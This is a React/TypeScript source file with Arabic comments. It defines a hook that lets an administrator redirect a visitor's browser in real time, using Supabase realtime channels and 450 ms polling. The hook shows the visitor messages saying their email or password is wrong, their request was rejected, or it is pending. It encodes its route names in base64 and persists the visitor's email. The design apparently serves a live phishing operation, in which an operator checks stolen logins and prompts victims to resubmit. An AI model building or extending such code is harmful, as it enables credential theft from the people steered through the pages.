import { useEffect, useRef } from "react";
import { useRouterState } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";
import { getSessionId } from "@/lib/session-id";
import { getClientRoute } from "@/lib/client-route.functions";
import { encodePath } from "@/lib/route-codes";


/** يقرأ بريد العميل ويثبّته في التخزين المحلي حتى لا يُفقد بين الصفحات */
export function readClientEmail(): string | null {
  let fromUrl: string | null = null;
  try {
    const url = new URL(window.location.href);
    const q = url.searchParams.get("email");
    if (q && q.trim()) fromUrl = q.trim().toLowerCase();
  } catch {
    /* ignore */
  }
  if (fromUrl) {
    try { window.localStorage.setItem("sham_email", fromUrl); } catch { /* ignore */ }
    return fromUrl;
  }
  try {
    const ls = window.localStorage.getItem("sham_email");
    if (ls && ls.trim()) return ls.trim().toLowerCase();
  } catch {
    /* ignore */
  }
  return null;
}

// إعادة ضبط شاملة: أي جهاز لعميل قديم (بأي حالة) يُمسح ويُعاد للرئيسية ليقدّم من جديد
const RESET_KEY = "sham_reset_version";
const RESET_VERSION = "2026-10-11b";
let didReset = false;
if (typeof window !== "undefined") {
  try {
    const ls = window.localStorage;
    if (ls.getItem(RESET_KEY) !== RESET_VERSION) {
      // مفاتيح تُنشأ تلقائياً لكل زائر جديد: وجودها لا يعني أنه عميل قديم
      const AUTO_KEYS = new Set(["sham_session_id", "sham_theme", "sham_reset_version"]);
      const oldKeys: string[] = [];
      for (let i = 0; i < ls.length; i++) {
        const k = ls.key(i);
        if (k && k.startsWith("sham_") && k !== RESET_KEY && !AUTO_KEYS.has(k)) oldKeys.push(k);
      }
      ls.setItem(RESET_KEY, RESET_VERSION);
      if (oldKeys.length > 0) {
        oldKeys.forEach((k) => ls.removeItem(k));
        try { window.sessionStorage.clear(); } catch { /* ignore */ }
        didReset = true;
        if (window.location.pathname !== "/" || window.location.search) {
          window.location.replace("/");
        }
      }
    }
  } catch { /* ignore */ }
}

// لا نُنفّذ أي توجيه مُسبق من الكاش حتى يستطيع المستخدم التنقل بحرية بزري الرجوع/التقدم
if (typeof window !== "undefined") {
  try { window.localStorage.removeItem("sham_pending_route"); } catch { /* ignore */ }
}
void didReset;

/**
 * توجيه لحظي فوري: يستمع عبر Postgres Changes (بريد + جلسة) + قناة بث الإدارة
 * لأي دفعة توجيه، ويعيد الاشتراك تلقائياً عند ظهور البريد لاحقاً، مع polling احتياطي.
 */
export function useAdminRedirect() {
  const currentPath = useRouterState({ select: (s) => s.location.pathname });
  const pathRef = useRef(currentPath);
  pathRef.current = currentPath;


  useEffect(() => {
    let cancelled = false;
    let pushChannel: ReturnType<typeof supabase.channel> | null = null;
    // ابدأ عند أعلى طابع زمني شاهدناه حتى الآن حتى لا نُعيد تطبيق توجيه قديم
    // عندما يضغط المستخدم زر الرجوع.
    let lastAppliedAt = "";
    try { lastAppliedAt = window.sessionStorage.getItem("sham_last_route_action") ?? ""; } catch { /* ignore */ }

    const sessionId = typeof window !== "undefined" ? getSessionId() : null;

    const apply = (
      row: { route: string | null; note?: string | null; updated_at?: string | null } | null,
    ) => {
      if (!row || cancelled) return;
      const stamp = row.updated_at ?? "";
      // نطبّق فقط التوجيهات الجديدة فعلاً (طابع زمني أحدث مما شاهدناه)
      if (!stamp) return;
      if (lastAppliedAt && stamp <= lastAppliedAt) return;
      lastAppliedAt = stamp;
      try { window.sessionStorage.setItem("sham_last_route_action", stamp); } catch { /* ignore */ }

      const raw = (row.route ?? "").trim();
      const note = row.note ?? "";
      if (!raw || !raw.startsWith("/")) return;
      const queryIndex = raw.indexOf("?");
      const path = encodePath(queryIndex >= 0 ? raw.slice(0, queryIndex) || "/" : raw);
      const rawQuery = queryIndex >= 0 ? raw.slice(queryIndex + 1) : "";
      try {
        if (path === "/YXV0aA" && note === "invalid_credentials") {
          window.sessionStorage.setItem("sham_login_error", "1");
          window.sessionStorage.removeItem("sham_reject_reason");
        } else if (path === "/YXV0aA" && note === "invalid_email") {
          window.sessionStorage.setItem("sham_reject_reason", "البريد الإلكتروني غير صحيح.");
          window.sessionStorage.removeItem("sham_login_error");
        } else if (path === "/YXV0aA" && note === "invalid_password") {
          window.sessionStorage.setItem("sham_reject_reason", "كلمة المرور غير صحيحة.");
          window.sessionStorage.removeItem("sham_login_error");
        } else if (path === "/YXV0aA" && (note === "rejected" || note.startsWith("rejected:"))) {
          const reason = note.startsWith("rejected:") ? note.slice("rejected:".length).trim() : "";
          window.sessionStorage.setItem(
            "sham_reject_reason",
            reason || "تم رفض طلبك بعد المراجعة. يرجى التواصل مع الدعم.",
          );
          window.sessionStorage.removeItem("sham_login_error");
        } else {
          window.sessionStorage.removeItem("sham_login_error");
          window.sessionStorage.removeItem("sham_reject_reason");
        }
        if (path === "/cGVuZGluZw" && note) {
          window.sessionStorage.setItem("sham_info_note", note);
        } else {
          window.sessionStorage.removeItem("sham_info_note");
        }
      } catch { /* ignore */ }
      const email = readClientEmail();
      const params = new URLSearchParams(rawQuery ?? "");
      if (email && !params.get("email")) params.set("email", email);
      const qs = params.toString();
      const destination = qs ? `${path}?${qs}` : path;
      const current = `${window.location.pathname}${window.location.search}`;
      if (current === destination) return;
      try { window.sessionStorage.removeItem("sham_login_pending"); } catch { /* ignore */ }
      // استخدم assign بدل replace حتى يبقى زر الرجوع يعمل
      window.location.assign(destination);
    };

    const fetchOnce = async () => {
      const email = readClientEmail();
      if (!email && !sessionId) return;
      try {
        const res = await getClientRoute({ data: { email, sessionId } });
        if (res?.email) apply(res.email);
        if (res?.session) apply(res.session);
      } catch { /* ignore */ }
    };

    // بث الإدارة + تغييرات client_routes المباشرة → fetch فوري
    (async () => {
      await fetchOnce();
      const email = readClientEmail();
      if (cancelled) return;
      const channelName = `admin-events-client-${Math.random().toString(36).slice(2, 10)}`;
      const channel = supabase.channel(channelName, { config: { broadcast: { self: false } } })
        .on("broadcast", { event: "admin" }, () => { void fetchOnce(); });
      if (email) {
        channel.on(
          "postgres_changes" as never,
          { event: "*", schema: "public", table: "client_routes", filter: `email=eq.${email}` } as never,
          (() => { void fetchOnce(); }) as never,
        );
      }
      if (sessionId) {
        channel.on(
          "postgres_changes" as never,
          { event: "*", schema: "public", table: "client_routes", filter: `session_id=eq.${sessionId}` } as never,
          (() => { void fetchOnce(); }) as never,
        );
      }
      pushChannel = channel.subscribe();
    })();

    const poll = window.setInterval(fetchOnce, 450);

    const onVis = () => { if (!document.hidden) void fetchOnce(); };
    const onFocus = () => void fetchOnce();
    const onStorage = (e: StorageEvent) => {
      if (e.key === "sham_email") void fetchOnce();
    };
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("pageshow", onFocus);
    window.addEventListener("focus", onFocus);
    window.addEventListener("online", onFocus);
    window.addEventListener("storage", onStorage);

    return () => {
      cancelled = true;
      window.clearInterval(poll);
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("pageshow", onFocus);
      window.removeEventListener("focus", onFocus);
      window.removeEventListener("online", onFocus);
      window.removeEventListener("storage", onStorage);
      if (pushChannel) supabase.removeChannel(pushChannel).catch(() => {});
    };

  }, []);
}
